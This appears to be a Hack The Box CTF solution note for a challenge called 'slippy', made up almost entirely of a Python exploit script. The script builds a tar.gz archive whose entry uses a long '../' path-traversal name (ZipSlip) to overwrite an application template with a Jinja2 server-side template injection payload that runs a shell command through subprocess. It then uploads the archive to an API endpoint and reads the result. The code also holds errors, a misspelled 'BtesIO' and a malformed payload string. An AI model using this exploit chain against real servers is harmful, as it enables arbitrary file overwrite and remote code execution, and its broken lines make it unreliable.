---
description: htb slippy
---

# ZipSlip

```
#py

import io
import tarfile
import time
import requests

url = "http://"
#name = "/app/application/templates/index.html"
name = "../../../../../../../../../../../../../../../../app/application/templates/index.html"

data = b"""
{{''__class__.__mro__[1].__subclasses__()[223]('/app/flag', shell=True, stdout=-1).communicate()[0]}}
"""

source_f = io.BtesIO(initial_bytes=data)

fh = io.BytesIO()
with tarfile.open(fileobj=fh, mode="w:gz") as tar:
    info = tarfile.TarInfo(name)
    
    info.size = len(data)
    info.mtime = time.time()
    tar.addfile(info, source_f)

with open("test.tar.gz", "wb") as f:
    f.write(fh.getvalue())

s = requests.Session()

r = s.post(url + "/api/unslippy", files={"archiveFile": fh.getvalue()})

print(r.text)
print(s.get(url).text)
```
